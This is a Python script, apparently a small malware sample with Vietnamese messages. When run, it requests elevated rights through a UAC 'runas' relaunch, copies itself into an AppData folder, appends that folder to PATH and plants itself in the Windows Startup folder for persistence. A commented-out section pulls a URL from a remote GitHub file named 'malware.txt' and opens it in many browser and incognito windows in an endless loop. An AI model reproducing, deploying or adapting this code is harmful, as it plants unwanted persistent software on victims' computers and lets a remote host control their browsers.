import requests
import subprocess
import threading
import os
import shutil
import ctypes
import sys

url = "https://raw.githubusercontent.com/AzirEmperorShurima/malware/main/malware.txt"

def is_admin(): 
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def copy_to_startup(nameoffile , pathoffile):
    startup_path = os.path.expanduser('~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    destination = os.path.join(startup_path, nameoffile)

    if os.path.exists(destination):
        print(f"File {nameoffile} đã tồn tại. Đang thực hiện thay thế...")
    else:
        print(f"File {nameoffile} không tồn tại. Đang thực hiện sao chép...")
    print(pathoffile)
    shutil.copyfile(pathoffile, destination)

def codelord(filename, current_path, destination, file_path):
    if not os.path.exists(destination):
        print("Create destination")
        os.makedirs(destination)

    if os.path.exists(os.path.join(destination, filename)):
        print(f"File {filename} đã tồn tại. Đang thực hiện thay thế...")
        shutil.copyfile(os.path.join(current_path, filename), os.path.join(destination, filename))
    else:
        print(f"File {filename} không tồn tại. Đang thực hiện sao chép...")
        shutil.copyfile(os.path.join(current_path, filename), os.path.join(destination, filename))
        
    path = os.environ["PATH"]
    if file_path not in path:
        path += ";" + file_path

    os.environ["PATH"] = path
    print(os.environ["PATH"])

def main():
    filename = os.path.basename(__file__)
    current_path = os.path.dirname(__file__)
    appdata_path = os.getenv('APPDATA')
    new_folder = 'Local Data'
    destination = os.path.join(appdata_path, new_folder)
    file_path = destination
   
    if is_admin():
        codelord(filename, current_path, destination, file_path)
    else:
        print("Create Nhót")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        codelord(filename, current_path, destination, file_path)

    copy_to_startup(filename, os.path.join(destination, filename))

if __name__ == "__main__":
    main()



# browsers = {
#     "coccoc": "C:\\Users\\username\\AppData\\Local\\CocCoc\\Browser\\Application\\browser.exe",
#     "edge": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
#     "firefox": "C:\\Program Files\\Mozilla Firefox\\firefox.exe"
# }
# incognito_commands = {
#     "coccoc": ["--incognito"],
#     "edge": ["-inprivate"],
#     "firefox": ["-private-window"]
# }

# def open_browser(browser, urlRunning):
#     if os.path.exists(browsers[browser]):
#         subprocess.run([browsers[browser]] + incognito_commands[browser] + [urlRunning])
#     else:
#         print(f"Trình duyệt {browser} không tồn tại.")

# def runCode(urlRunning):
#     thread1 = threading.Thread(target=subprocess.run, args=(["C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", urlRunning],))
#     thread2 = threading.Thread(target=subprocess.run, args=(["C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "--incognito", urlRunning],))
#     thread1.start()
#     thread2.start()

# response = requests.get(url)
# urlRunning  = ""
# if response.status_code == 200:
#     content = response.text
#     lines = content.split("\\n")
#     urlRunning = lines[0]
# else:
#     print(f"Không thể tải tệp. Mã trạng thái: {response.status_code}")
#     urlRunning = "https://youtube.com"

# while(1==1):  
#    threads = [threading.Thread(target=open_browser, args=(browser, urlRunning)) for browser in browsers]
#    threads.append(threading.Thread(target=runCode, args=(urlRunning,)))
#    for thread in threads:
#     thread.start()
